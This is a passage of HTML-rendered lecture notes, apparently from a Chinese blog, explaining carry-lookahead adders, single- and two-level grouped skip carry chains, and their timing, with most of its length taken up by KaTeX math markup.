xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1.5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">1.5t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>d</mi><mi>i</mi></msub><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">d_it_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>形成后，只需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">2.5t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>就可以产生全部的进位。</p><p>可以看到这个速度比串行进位链已经提升了很多，但是当位数比较大时（比如32位），这个电路的设计会肉眼可见的变得非常复杂。为了简化电路设计，我们给出了以下两种折中方案，也就是我们先前提到过的单重分组跳跃与双重分组跳跃。</p><h5 id="单重分组跳跃进位链"><a class="markdownIt-Anchor" href="#单重分组跳跃进位链"></a> 单重分组跳跃进位链</h5><p>我们将n位全加器分若干小组，小组中的进位同时产生，小组与小组之间采用串行进位。以n=16为例，我们将全加器分为四组，可以设计出如下的电路图：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618200932273.png" alt="image-20240618200932273" style="zoom:50%;" /><p>此时完成一个小组的用时为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2.5</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">2.5t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>，那么经过<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>4</mn><mo>×</mo><mn>2.5</mn><msub><mi>t</mi><mi>y</mi></msub><mo>=</mo><mn>10</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">4\times2.5t_y=10t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">4</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">2</span><span class="mord">.</span><span class="mord">5</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">1</span><span class="mord">0</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>即可完成四组的进位信号生成，而如果采用串行进位链，则需要<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn><msub><mi>t</mi><mi>y</mi></msub></mrow><annotation encoding="application/x-tex">32t_y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9305479999999999em;vertical-align:-0.286108em;"></span><span class="mord">3</span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>。</p><h5 id="双重分组跳跃进位链"><a class="markdownIt-Anchor" href="#双重分组跳跃进位链"></a> 双重分组跳跃进位链</h5><p>双重分组即n位全加器分若干大组，大组中又包含若干小组。每个大组中小组的最高位进位同时产生。大组与大组之间采用串行进位。以n=32为例，我们把32分为两个16的大组，再把16按照单重跳跃的方式进行分组，绘图如下：</p><img src="https://adam8en-blog-image.oss-cn-guangzhou.aliyuncs.com/image-20240618201932503.png" alt="image-20240618201932503" style="zoom:50%;" /><p>其中，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>15</mn></msub></mrow><annotation encoding="application/x-tex">C_{15}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">5</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>产生的进位信号作为串行进位输入到第一大组和第4小组中。此时特点可总结为：<font style="color:red">组内并行，组间串行。</font></p><p>本质上，双重分组跳跃链就是对单重分组跳跃链的一层抽象，我们还可以根据这种抽象思维设计出更多重的跳跃链。这就是<font style="color:blue;font-size:24px">A new level of abstraction</font>。</p><h6 id="大组进位分析"><a class="markdownIt-Anchor" href="#大组进位分析"></a> 大组进位分析</h6><p>上述的双重分组跳跃链只是一个简图，我们还没有讨论大组之间的电路是怎么设计的。</p><p>我们从第8小组为例，分析它的表达式。</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>3</mn></msub><mo>=</mo><msub><mi>d</mi><mn>3</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><munder><munder><mrow><msub><mi>d</mi><mn>3</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>d</mi><mn>2</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>t</mi><mn>2</mn></msub><msub><mi>d</mi><mn>1</mn></msub><mo>+</mo><msub><mi>t</mi><mn>3</mn></msub><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub><msub><mi>d</mi><mn>0</mn></msub></mrow><mo stretchy="true">⏟</mo></munder><msub><mi>D</mi><mn>8</mn></msub></munder><mo>+</mo><munder><munder><mrow><msub><mi>t</mi><mn>3</mn></msub><msub><mi>t</mi><mn>2</mn></msub><msub><mi>t</mi><mn>1</mn></msub><msub><mi>t</mi><mn>0</mn></msub><msub><mi>C</mi><mrow><mo>−</mo><mn>1</mn></mrow></msub></mrow><mo stretchy="true">⏟</mo></munder><msub><mi>T</mi><mn>8</mn></msub></munder></mrow><annotation encoding="application/x-tex">C_{3}=d_{3}+t_{3} C_{2}=\underbrace{d_{3}+t_{3} d_{2}+t_{3} t_{2} d_{1}+t_{3} t_{2} t_{1} d_{0}}_{D_{8}}+\underbrace{t_{3} t_{2} t_{1} t_{0} C_{-1}}_{T_{8}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.2708709999999996em;vertical-align:-1.5764310000000001em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6944399999999997em;"><span style="top:-1.523669em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.02778em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.69444em;"><span class="svg-align" style="top:-2.202em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.548em;min-width:1.6em;"><span class="brace-left" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMinYMin slice'><path d='M0 6l6-6h17c12.688 0 19.313.3 20 1 4 4 7.313 8.3 10 13 35.313 51.3 80.813 93.8 136.5 127.5 55.688 33.7 117.188 55.8 184.5 66.5.688 0 2 .3 4 1 18.688 2.7 76 4.3 172 5h399450v120H429l-6-1c-124.688-8-235-61.7-331-161C60.687 138.7 32.312 99.3 7 54L0 41V6z'/></svg></span><span class="brace-center" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMidYMin slice'><path d='M199572 214c100.7 8.3 195.3 44 280 108 55.3 42 101.7 93 139 153l9 14c2.7-4 5.7-8.7 9-14 53.3-86.7 123.7-153 211-199 66.7-36 137.3-56.3 212-62h199568v120H200432c-178.3 11.7-311.7 78.3-403 201-6 8-9.7 12-11 12-.7.7-6.7 1-18 1s-17.3-.3-18-1c-1.3 0-5-4-11-12-44.7-59.3-101.3-106.3-170-141s-145.3-54.3-229-60H0V214z'/></svg></span><span class="brace-right" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMaxYMin slice'><path d='M399994 0l6 6v35l-6 11c-56 104-135.3 181.3-238 232-57.3 28.7-117 45-179 50H-300V214h399897c43.3-7 81-15 113-26 100.7-33 179.7-91 237-174 2.7-5 6-9 10-13 .7-1 7.3-1 20-1h17z'/></svg></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.798em;"><span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5764310000000001em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:2.318092em;vertical-align:-1.634762em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span style="top:-1.465338em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.13889em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">8</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord munder"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.68333em;"><span class="svg-align" style="top:-2.143669em;"><span class="pstrut" style="height:3em;"></span><span class="stretchy" style="height:0.548em;min-width:1.6em;"><span class="brace-left" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMinYMin slice'><path d='M0 6l6-6h17c12.688 0 19.313.3 20 1 4 4 7.313 8.3 10 13 35.313 51.3 80.813 93.8 136.5 127.5 55.688 33.7 117.188 55.8 184.5 66.5.688 0 2 .3 4 1 18.688 2.7 76 4.3 172 5h399450v120H429l-6-1c-124.688-8-235-61.7-331-161C60.687 138.7 32.312 99.3 7 54L0 41V6z'/></svg></span><span class="brace-center" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMidYMin slice'><path d='M199572 214c100.7 8.3 195.3 44 280 108 55.3 42 101.7 93 139 153l9 14c2.7-4 5.7-8.7 9-14 53.3-86.7 123.7-153 211-199 66.7-36 137.3-56.3 212-62h199568v120H200432c-178.3 11.7-311.7 78.3-403 201-6 8-9.7 12-11 12-.7.7-6.7 1-18 1s-17.3-.3-18-1c-1.3 0-5-4-11-12-44.7-59.3-101.3-106.3-170-141s-145.3-54.3-229-60H0V214z'/></svg></span><span class="brace-right" style="height:0.548em;"><svg width='400em' height='0.548em' viewBox='0 0 400000 548' preserveAspectRatio='xMaxYMin slice'><path d='M399994 0l6 6v35l-6 11c-56 104-135.3 181.3-238 232-57.3 28.7-117 45-179 50H-300V214h399897c43.3-7 81-15 113-26 100.7-33 179.7-91 237-174 2.7-5 6-9 10-13 .7-1 7.3-1 20-1h17z'/></svg></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.208331em;"><span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8563310000000001em;"><span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.634762em;"><span></span></span></span></span></span></span></span></span></p><p>其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>D</mi><mn>8</mn></msub></mrow><annotation encoding="application/x-tex">D_8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>是第8小组的本地进位，和外来进位无关；<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>8</mn></msub></mrow><annotation encoding="application/x-tex">T_8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">8</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" 